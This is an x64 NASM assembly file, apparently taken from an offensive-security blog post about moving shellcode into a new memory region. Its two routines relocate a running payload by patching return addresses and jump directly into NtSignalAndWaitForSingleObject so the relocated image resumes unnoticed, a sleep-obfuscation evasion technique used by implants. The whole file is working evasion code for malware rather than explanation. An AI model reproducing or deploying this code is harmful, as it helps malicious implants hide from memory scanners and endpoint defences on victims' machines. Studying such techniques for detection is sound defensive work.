; Functions related to moving shellcode in new region (Source: https://sillywa.re/posts/flower-da-flowin-shc/)

[BITS 64]

DEFAULT REL
GLOBAL FwPatchRetAddr
GLOBAL FwRopStart

[SECTION .text$B]
    FwPatchRetAddr:
        mov r8, [ rbp + 8 ]
        sub r8, rcx
        add r8, rdx
        mov [ rbp + 8 ], r8
        ret

    FwRopStart:
        ;; save our return address in a volatile register
        pop r10

        push r12

        ;; setup function args from struct
        mov r12, rcx
        mov r11, [ r12 ]              ; Rcx->Func
        mov rcx, [ r12 + 0x8  ]       ; Rcx->Signal
        mov rdx, [ r12 + 0x10 ]       ; Rcx->Wait
        mov r8,  [ r12 + 0x18 ]       ; Rcx->Alertable
        mov r9,  [ r12 + 0x20 ]       ; Rcx->Timeout

        ;; calculate new return address
        sub r10, [ r12 + 0x28 ]       ; Rcx->ImgBase
        add r10, [ r12 + 0x30 ]       ; Rcx->NewBase

        pop r12

        ;; patch return address of the current frame
        push r10

        ;; JMP to NtSignalAndWaitForSingleObject
        ;;
        ;; we JMP to it instead of CALL'ing it to not generate a
        ;; new frame so we can patch the retaddr of NtSignalAndWaitForSingleObject
        jmp r11         ; Rcx->Func

        ;; no ret since NtSignalAndWaitForSingleObject
        ;; will do it for us.
